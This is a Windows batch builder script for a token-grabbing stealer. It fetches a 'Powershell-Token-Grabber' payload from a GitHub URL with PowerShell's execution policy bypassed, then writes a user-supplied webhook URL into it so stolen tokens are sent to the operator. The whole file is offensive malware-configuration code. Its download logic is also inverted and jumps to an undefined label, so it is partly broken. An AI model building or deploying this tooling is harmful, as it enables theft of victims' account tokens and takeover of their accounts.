@echo off
setlocal EnableDelayedExpansion

echo Bulid Options (1=bat, 2=ps1):
choice /C 12 /M "Select a build option:" /N

if %errorlevel% == 1 ( set "file=bat" ) else ( set "file=ps1" )

set "urled=https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.%file%"

echo Building bat file...
if not exist main.%file% (
    echo main.%file% not found!
    goto :make_file
) else (
    echo Downloading main.%file% from %urled%...
    ::now I could technically do ALL of this in batch but ion feel suicidal today
    powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "(Invoke-WebRequest -Uri '%urled%' -UseBasicParsing).Content | Set-Content main.%file%"
)

echo Enter webhook URL:
set /p url="URL: "

set "batch_path=%~dp0\main.%file%"

powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "(Get-Content %batch_path%) -replace 'YOUR_WEBHOOK_HERE', '%url%' | Set-Content %batch_path%"

echo finished
pause
goto :eof